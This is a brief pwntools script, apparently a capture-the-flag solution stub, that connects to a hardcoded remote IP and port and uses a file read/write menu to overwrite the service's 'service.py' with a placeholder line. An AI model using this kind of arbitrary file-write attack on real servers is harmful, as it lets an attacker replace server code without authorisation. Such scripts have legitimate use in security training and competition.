from pwn import *
from functools import reduce

host = '35.201.132.60'
port = 12000
r = remote(host, port)

#convert string to hex
def toHex(s):
    lst = []
    for ch in s:
        hv = hex(ord(ch)).replace('0x', '')
        if len(hv) == 1:
            hv = '0'+hv
        lst.append(hv)
    return reduce(lambda x,y:x+y, lst)

def R3adfile(filename):
    r.recvuntil(':')
    r.sendline('0')
    r.recvuntil(':')
    r.sendline(filename)

def Writ3file(filename, content):
    r.recvuntil(':')
    r.sendline('1')
    r.recvuntil(':')
    r.sendline(filename)
    r.recvuntil(':')
    r.sendline(toHex(content))

# Name
r.recvuntil(':')
r.sendline('asdfasdf')

Writ3file('service.py', 'print yeah')
# R3adfile('test.py')

r.interactive()
